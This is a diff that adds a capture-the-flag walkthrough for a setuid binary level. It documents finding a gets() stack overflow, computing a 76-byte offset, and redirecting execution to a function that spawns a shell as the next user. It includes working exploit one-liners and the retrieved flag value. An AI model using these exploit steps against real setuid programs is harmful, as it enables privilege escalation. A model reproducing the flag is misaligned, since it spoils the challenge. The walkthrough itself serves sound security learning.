@@ -1,0 +1,56 @@
+# Walkthrough — Level1
+
+## Summary
+
+This walkthrough documents the exact steps used to find and exploit the vulnerability in **level1** to escalate to `level2` and retrieve the flag.
+
+## Steps
+
+1. **Inspect the binary**
+
+   * The file is a 32-bit ELF with setuid/setgid: `-rwsr-s---+`.
+   * Confirmed dynamically linked and not stripped.
+
+2. **Discover exported functions**
+
+   * In `gdb`: `info functions` — found `gets@plt` and a `run` function at `0x08048444`.
+
+3. **Disassemble `main` and `run`**
+
+   * `main` calls `gets` into a stack buffer (unsafe input).
+   * `run` calls `fwrite` then `system` with a fixed pointer — calling `run` gives a privileged action.
+
+4. **Generate cyclic pattern and crash target**
+
+   * Used a pattern generator to create a unique pattern and fed it to the program; the crash produced EIP value `0x63413563`.
+
+5. **Compute offset**
+
+   * The pattern tool returned an offset of **76** bytes for `0x63413563` — so 76 bytes of input overwrite EIP.
+
+6. **Build payload**
+
+   * Overwrite saved return address with `0x08048444` (address of `run`) in little-endian: `\x44\x84\x04\x08`.
+   * Keep stdin open so the spawned shell remains interactive by piping `cat` after the payload.
+
+7. **Exploit command used**
+
+   ```sh
+   ( printf '%.0sA' {1..76}; printf '\x44\x84\x04\x08\n'; cat ) | ./level1
+   ```
+
+   Or equivalently:
+
+   ```sh
+   ( python -c "import sys; sys.stdout.write('A'*76 + '\\x44\\x84\\x04\\x08')"; cat ) | ./level1
+   ```
+
+8. **Result**
+
+   * The program printed `Good... Wait what?` and returned a shell as `level2` (check with `whoami` / `id`).
+   * Retrieved the flag:
+
+     ```
+     cat /home/user/level2/.pass
+     # 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+     ```
